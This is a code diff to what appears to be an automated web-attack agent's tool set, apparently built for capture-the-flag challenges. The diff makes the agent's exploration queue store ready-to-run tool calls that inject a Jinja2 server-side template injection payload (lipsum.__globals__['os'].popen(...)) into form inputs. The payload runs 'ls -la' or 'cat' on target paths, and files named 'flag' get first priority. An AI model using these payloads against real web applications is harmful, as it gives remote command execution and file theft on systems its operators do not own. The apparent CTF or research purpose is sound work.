@@ -237,12 +237,18 @@ async def fill_input(selector: str, value: str, submit: bool = True) -> str:
                         item_type = "dir" if is_dir == 'd' else "file"
                         priority = 1 if 'flag' in name.lower() else 2
 
+                        # Build instruction with the current selector
+                        if item_type == "dir":
+                            cmd = f"ls -la {full_path}"
+                        else:
+                            cmd = f"cat {full_path}"
+                        instruction = f"fill_input('{selector}', \"{{{{lipsum.__globals__['os'].popen('{cmd}').read()}}}}\")"
+
                         # Add to queue if not already there
                         if not any(item["target"] == full_path for item in _exploration_queue):
                             _exploration_queue.append({
-                                "type": item_type,
                                 "target": full_path,
-                                "reason": f"Found in {current_path}",
+                                "instruction": instruction,
                                 "priority": priority,
                             })
                             queued_items.append(f"{item_type}:{full_path}")
@@ -746,11 +752,17 @@ def _analyze_payload_response(payload: str, payload_type: str, html: str, origin
                         item_type = "dir" if is_dir == 'd' else "file"
                         priority = 1 if 'flag' in name.lower() else 2
 
+                        # Build instruction with the input selector
+                        if item_type == "dir":
+                            cmd = f"ls -la {full_path}"
+                        else:
+                            cmd = f"cat {full_path}"
+                        instruction = f"fill_input('{input_selector}', \"{{{{lipsum.__globals__['os'].popen('{cmd}').read()}}}}\")"
+
                         if not any(item["target"] == full_path for item in _exploration_queue):
                             _exploration_queue.append({
-                                "type": item_type,
                                 "target": full_path,
-                                "reason": f"Found in {current_path}",
+                                "instruction": instruction,
                                 "priority": priority,
                             })
                             queued_items.append(f"{item_type}:{full_path}")
@@ -1303,16 +1315,15 @@ async def type_slowly(selector: str, text: str) -> str:
 
 
 @tool
-def add_to_queue(target: str, item_type: str, reason: str, priority: int = 2) -> str:
+def add_to_queue(target: str, instruction: str, priority: int = 2) -> str:
     """Add an item to the exploration queue for later investigation.
 
     Use this to track interesting paths, files, or payloads you want to explore.
     Items are automatically sorted by priority.
 
     Args:
-        target: The path/file/URL to explore (e.g., "/challenge", "/flag.txt").
-        item_type: Type of item - "dir", "file", "path", "payload", or "url".
-        reason: Brief explanation of why this is interesting.
+        target: Identifier for the item (e.g., "/challenge", "/flag.txt").
+        instruction: Full instruction with tool call (e.g., "fill_input('#input', 'payload')").
         priority: 1=high (explore first), 2=medium, 3=low.
 
     Returns:
@@ -1325,16 +1336,15 @@ def add_to_queue(target: str, item_type: str, reason: str, priority: int = 2) ->
         return f"'{target}' is already in the queue."
 
     _exploration_queue.append({
-        "type": item_type,
         "target": target,
-        "reason": reason,
+        "instruction": instruction,
         "priority": priority,
     })
 
     # Sort by priority
     _exploration_queue.sort(key=lambda x: x["priority"])
 
-    log_action("Queue Add", f"Added {item_type}: {target} (priority {priority})")
+    log_action("Queue Add", f"Added: {target} (priority {priority})")
     return f"Added '{target}' to queue. Queue now has {len(_exploration_queue)} items."
 
 
